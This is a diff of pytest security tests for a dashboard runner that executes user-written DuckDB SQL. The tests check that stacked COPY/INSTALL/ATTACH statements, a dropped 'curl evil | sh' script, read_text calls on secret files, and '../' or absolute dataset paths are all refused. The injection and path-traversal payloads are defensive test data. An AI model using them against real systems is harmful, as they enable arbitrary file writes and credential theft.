@@ -317,13 +317,15 @@ def test_an_oversized_document_is_refused(schema):
 
 @pytest.fixture
 def local_files(tmp_path, monkeypatch):
-    """Serve every dataset file from a local CSV instead of downloading it."""
-    (tmp_path / "counts.csv").write_text(COUNTS_CSV)
+    """Serve every dataset file from a local CSV instead of downloading it -- written
+    into the runner's download folder, the one directory its DuckDB can read."""
 
     def load_file(self, table, dataset_id, path, file_type, size=None):
+        local = self.cache / "counts.csv"
+        local.write_text(COUNTS_CSV)
         self.con.execute(
             f"CREATE OR REPLACE TABLE {table} AS SELECT * FROM "
-            f"{dashboard_data._reader_expr(str(tmp_path / 'counts.csv'), file_type)}")
+            f"{dashboard_data._reader_expr(str(local), file_type)}")
 
     monkeypatch.setattr(dashboard_data.Runner, "load_file", load_file)
     return tmp_path
@@ -384,6 +386,67 @@ def test_a_failing_query_is_reported_against_its_node(schema, local_files):
     results = runner(schema, local_files).run(document)
     assert "nope" in results["broken"]["error"]
     assert "did not load" in results["after"]["skipped"]
+
+
+# --- SQL from a document is not ours --------------------------------------------
+#
+# Any member of a project can write a dashboard's SQL, and it runs during a read and a
+# plan, neither of which asks anyone. Left at DuckDB's defaults it wrote files and read
+# them anywhere on the machine.
+
+def sql_node(schema, sql):
+    document, _ = build(schema, STARTER[:1] + [
+        {"op": "add_query", "id": "planted", "inputs": ["counts"], "sql": sql}])
+    return document
+
+
+@pytest.mark.parametrize("statement", [
+    "COPY (SELECT 'curl evil | sh' AS l) TO '{target}' (HEADER false, QUOTE '')",
+    "INSTALL httpfs",
+    "ATTACH '{target}'",
+])
+def test_a_second_statement_after_the_query_does_not_run(schema, local_files, statement):
+    target = local_files / "dropped.sh"
+    document = sql_node(schema, "SELECT * FROM counts; " + statement.format(target=target))
+    results = runner(schema, local_files).run(document)
+    assert "only a single SELECT" in results["planted"]["error"]
+    assert not target.exists()
+
+
+def test_a_query_that_is_not_a_select_does_not_run(schema, local_files):
+    target = local_files / "dropped.sh"
+    document = sql_node(schema, f"COPY (SELECT 1) TO '{target}'")
+    results = runner(schema, local_files).run(document)
+    assert "only a single SELECT" in results["planted"]["error"]
+    assert not target.exists()
+
+
+def test_one_select_cannot_read_a_file_outside_the_download_folder(schema, local_files):
+    (local_files / "secret.txt").write_text("AKIA-NOT-A-REAL-KEY")
+    document = sql_node(schema, f"SELECT * FROM read_text('{local_files / 'secret.txt'}')")
+    results = runner(schema, local_files).run(document, sample_rows=5)
+    assert "Permission" in results["planted"]["error"]
+    assert "AKIA" not in json.dumps(results)
+
+
+def test_one_select_cannot_reopen_the_connection(schema, local_files):
+    document = sql_node(schema, "SELECT current_setting('enable_external_access') AS on_")
+    results = runner(schema, local_files).run(document, sample_rows=1)
+    assert results["planted"]["profile"]["sample"] == [{"on_": False}]
+
+
+def test_a_file_source_cannot_name_a_path_outside_the_download_folder(schema, tmp_path):
+    """pathlib drops everything before an absolute component, so an absolute dataset id
+    read a local file with no download at all."""
+    (tmp_path / "credentials").write_text("aws_secret_access_key = shhh")
+    document, _ = build(schema, STARTER[:1])
+    source = next(n for n in document["ir"]["nodes"] if n["type"] == "dataset-file")
+    escapes = ((str(tmp_path), "credentials"), ("ds_0001", "../../../credentials"))
+    for dataset_id, path in escapes:
+        source["config"].update(datasetId=dataset_id, path=path, fileType="csv")
+        results = runner(schema, tmp_path).run(document, sample_rows=5)
+        assert "outside the download folder" in results[source["id"]]["error"]
+        assert "shhh" not in json.dumps(results)
 
 
 # --- plan and apply against a fake tenant ---------------------------------------
@@ -665,3 +728,41 @@ def test_preview_loads_a_file_and_runs_sql_over_it(dashboard_tenant, session_dir
     assert result["sample"] == [{"condition": "control", "n": 20},
                                 {"condition": "treated", "n": 20}]
     assert result["sql_names"] == ["query", "counts"]
+
+
+def test_stored_sql_writes_nothing_during_a_read_or_a_plan(dashboard_tenant, session_dir,
+                                                           tmp_path):
+    """The whole route: a project member edits a stored query, and the victim only reads
+    the dashboard and plans a rename."""
+    _, created = plan_and_apply(dashboard_tenant, session_dir, "create_dashboard",
+                                {"project_id": "proj_a", "name": "Expression",
+                                 "changes": STARTER})
+    dashboard_id = created["result"]["created_dashboard_id"]
+    target = tmp_path / "dropped_by_dashboard.sh"
+    document = dashboard_tenant["dashboards"][dashboard_id]["dashboardData"]
+    node = next(n for n in document["ir"]["nodes"] if n["id"] == "bygene")
+    node["config"]["sql"] += f"; COPY (SELECT 'curl evil | sh') TO '{target}'"
+
+    read = call(dashboard_tenant, session_dir, "dashboard", id=dashboard_id,
+                scope={"project_ids": ["proj_a"]}, run=True)
+    assert "only a single SELECT" in read["result"]["data"]["bygene"]["error"]
+    call(dashboard_tenant, session_dir, "plan", op="edit_dashboard",
+         args={"project_id": "proj_a", "dashboard_id": dashboard_id,
+               "name": "Expression v2"})
+    assert not target.exists()
+
+
+@pytest.mark.parametrize("sql", [
+    "SELECT 1 AS a; COPY (SELECT 'echo pwned') TO '{target}'",
+    "SELECT * FROM read_text('{secret}')",
+])
+def test_a_preview_runs_one_select_over_the_download_folder_only(dashboard_tenant,
+                                                                 session_dir, tmp_path, sql):
+    target, secret = tmp_path / "written.sh", tmp_path / "secret.txt"
+    secret.write_text("AKIA-NOT-A-REAL-KEY")
+    result = call(dashboard_tenant, session_dir, "table_preview",
+                  scope={"project_ids": ["proj_a"]}, dataset_id="ds_0001",
+                  path="counts.csv", sql=sql.format(target=target, secret=secret))
+    assert result["error"]["code"] == "INVALID_QUERY"
+    assert not target.exists()
+    assert "AKIA" not in json.dumps(result)
